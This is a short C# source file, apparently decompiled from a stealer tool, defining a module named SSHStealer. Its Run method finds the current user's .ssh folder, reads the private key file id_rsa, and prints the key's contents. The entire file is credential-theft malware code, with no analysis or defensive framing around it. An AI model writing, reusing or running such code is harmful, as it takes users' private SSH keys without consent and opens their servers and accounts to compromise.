using System;
using System.IO;

namespace Modules
{
	// Token: 0x02000019 RID: 25
	public class SSHStealer
	{
		// Token: 0x06000033 RID: 51 RVA: 0x00004124 File Offset: 0x00002324
		public void Run()
		{
			Console.WriteLine("[+] Executing SSH...");
			string text = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.ssh";
			if (!Directory.Exists(text))
			{
				return;
			}
			Console.WriteLine("[+] User Has SSH Dir.");
			string text2 = text + "\\id_rsa";
			if (!File.Exists(text2))
			{
				return;
			}
			string text3 = File.ReadAllText(text2);
			if (string.IsNullOrEmpty(text3))
			{
				return;
			}
			Console.WriteLine(text3);
		}
	}
}
